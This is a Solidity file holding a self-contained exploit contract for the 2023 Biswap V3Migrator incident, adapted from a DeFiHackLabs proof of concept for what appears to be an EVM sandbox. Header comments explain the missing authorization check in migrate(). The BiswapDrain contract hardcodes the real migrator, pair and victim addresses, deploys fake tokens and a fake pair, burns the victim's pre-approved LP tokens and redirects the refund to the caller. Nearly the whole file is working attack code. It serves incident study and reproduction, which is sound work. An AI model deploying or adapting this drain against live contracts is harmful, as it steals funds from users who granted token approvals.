// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-Biswap).
//
// The DeFiHackLabs PoC (test/Biswap_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` (`address(this)` is the attacker; it deploys helper
// FakeToken / FakePair contracts and orchestrates two `migrate()` calls). There
// is no single attack contract to deploy, so this is a faithful, self-contained
// copy of `testExploit()` moved into `run()`, with the helper contracts inlined
// (FakeToken / FakePair copied verbatim — they are plain trivial ERC20 / fake
// pair stubs) and minimal inline interfaces (no imports).
//
// Root cause — confirmed against the FETCHED source of the V3Migrator
// (0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, contracts_periphery_V3Migrator.sol):
//
//   function migrate(MigrateParams calldata params) external override returns(uint refund0, uint refund1){
//       // burn v2 liquidity to this address
//       IBiswapPair(params.pair).transferFrom(params.recipient, params.pair, params.liquidityToMigrate); // ⚠️ no auth on recipient
//       (uint256 amount0V2, uint256 amount1V2) = IBiswapPair(params.pair).burn(address(this));
//       ...
//       if (amount0V3 < amount0V2) {
//           ...
//           safeTransfer(params.token0, params.recipient, refund0);   // ⚠️ token & recipient both caller-chosen
//       }
//
// `migrate()` spends `recipient`'s LP via `transferFrom` without ever checking
// that `msg.sender == recipient` or that the caller is authorized to spend
// `recipient`'s LP. The victim had pre-approved the migrator for their LP, so
// any caller can drain the victim's position. The attacker compounds this with
// a SECOND `migrate()` against a self-deployed fake pair whose `burn()` reports
// the same amounts the migrator is now holding — redirecting the real BTCB/USDT
// dust-refund to the attacker.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function burn(address) external returns (uint256, uint256);
}

interface IBiswapFactoryV3 {
    function newPool(address tokenX, address tokenY, uint16 fee, int24 currentPoint) external returns (address);
}

struct MigrateParams {
    address pair; // the Uniswap v2-compatible pair
    uint256 liquidityToMigrate; // expected to be balanceOf(msg.sender)
    address token0;
    address token1;
    uint16 fee;
    int24 tickLower;
    int24 tickUpper;
    uint128 amount0Min; // must be discounted by percentageToMigrate
    uint128 amount1Min; // must be discounted by percentageToMigrate
    address recipient;
    uint256 deadline;
    bool refundAsETH;
}

interface IV3Migrator {
    function migrate(MigrateParams calldata params) external returns (uint256 refund0, uint256 refund1);
}

// --- inlined helper contracts (copied verbatim from the Foundry test) --------

contract SimpleERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract FakeToken is SimpleERC20 {
    constructor() SimpleERC20("fake", "fake") {
        _mint(msg.sender, 10_000e18 * 1e18);
    }
}

contract FakePair is SimpleERC20 {
    uint256 token0Amount;
    uint256 token1Amount;

    constructor() SimpleERC20("fakePair", "fakePair") {
        _mint(msg.sender, 10_000e18 * 1e18);
    }

    function update(uint256 t0, uint256 t1) external {
        token0Amount = t0;
        token1Amount = t1;
    }

    function burn(address to) external returns (uint256, uint256) {
        return (token0Amount, token1Amount);
    }
}

// --- the attack --------------------------------------------------------------

contract BiswapDrain {
    IV3Migrator migrator = IV3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);
    IUniswapV2Pair pairToMigrate = IUniswapV2Pair(0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85);
    address victimAddress = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;
    IBiswapFactoryV3 biswapV3 = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);

    function run() external {
        //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator
        FakeToken fakeToken0 = new FakeToken();
        FakeToken fakeToken1 = new FakeToken();
        FakePair fakePair = new FakePair();
        biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);
        fakeToken0.transfer(address(migrator), 1e9 * 1e18);
        fakeToken1.transfer(address(migrator), 1e9 * 1e18);

        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);
        IERC20 token0 = IERC20(pairToMigrate.token0());
        IERC20 token1 = IERC20(pairToMigrate.token1());

        //1. Burn victim's LP token and add liquidity with fake tokens
        MigrateParams memory params = MigrateParams(
            address(pairToMigrate),
            liquidityValue,
            address(fakeToken1),
            address(fakeToken0),
            150,
            10_000,
            20_000,
            0,
            0,
            victimAddress,
            block.timestamp + 1 minutes,
            false
        );
        migrator.migrate(params);

        uint256 token0Balance = token0.balanceOf(address(migrator));
        uint256 token1Balance = token1.balanceOf(address(migrator));
        fakePair.update(token0Balance, token1Balance);

        //2. Steal tokens
        fakePair.transfer(address(this), 1e9 * 1e18);
        fakePair.approve(address(migrator), 1e9 * 1e18);
        MigrateParams memory params2 = MigrateParams(
            address(fakePair),
            liquidityValue,
            address(token0),
            address(token1),
            800,
            10_000,
            20_000,
            0,
            0,
            address(this),
            block.timestamp + 1 minutes,
            false
        );
        migrator.migrate(params2);
    }
}
